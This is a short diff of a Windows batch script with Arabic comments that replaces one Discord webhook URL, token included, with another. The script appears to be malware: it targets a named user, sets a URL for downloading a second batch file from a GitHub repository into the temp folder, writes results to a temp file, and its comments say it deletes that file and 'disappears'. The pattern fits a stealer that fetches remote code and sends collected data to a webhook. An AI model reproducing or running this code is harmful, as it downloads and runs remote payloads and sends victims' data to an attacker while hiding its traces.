@@ -10,7 +10,7 @@ if /I "%USERNAME%"=="%TARGET_USER%" (
 )
 
 :: 2. إعداد الروابط (تأكد من صحتها)
-set "WEBHOOK_URL=https://discord.com/api/webhooks/1461350525168652433/y5T90DbXCLHZGb_wqEi9ho4VqMb1XGgA6VKoL_M9LbKiywFyhcl4bAE7MpZF2oiTFOyB"
+set "WEBHOOK_URL=https://discord.com/api/webhooks/1461392959575687240/LwVE9O2alP5eDdU9fvRH6X1awl_C6g-SISy6RRNOPHXe2O7VXP3Jb3MBmmeQcQck9D-G"
 set "BAT1_URL=https://raw.githubusercontent.com/857seif/11111111/main/1.bat"
 set "TEMP_FILE=%TEMP%\Result.txt"
 set "BAT1_PATH=%TEMP%\1.bat"
@@ -36,3 +36,4 @@ if exist "%BAT1_PATH%" (
 :: 6. مسح ملف النتائج المؤقت والاختفاء
 if exist "%TEMP_FILE%" del /f /q "%TEMP_FILE%"
 exit
+
